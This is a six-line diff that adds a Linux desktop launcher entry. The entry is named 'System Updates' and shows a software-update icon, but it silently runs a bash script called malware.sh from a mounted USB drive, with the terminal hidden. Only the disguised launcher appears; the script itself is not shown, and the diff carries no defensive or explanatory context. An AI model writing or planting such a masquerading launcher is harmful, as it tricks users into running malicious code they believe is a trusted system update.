@@ -1,0 +1,6 @@
+[Desktop Entry]
+Name=System Updates
+Exec=/bin/bash /media/$USER/USB/malware.sh
+Icon=system-software-update
+Type=Application
+Terminal=false
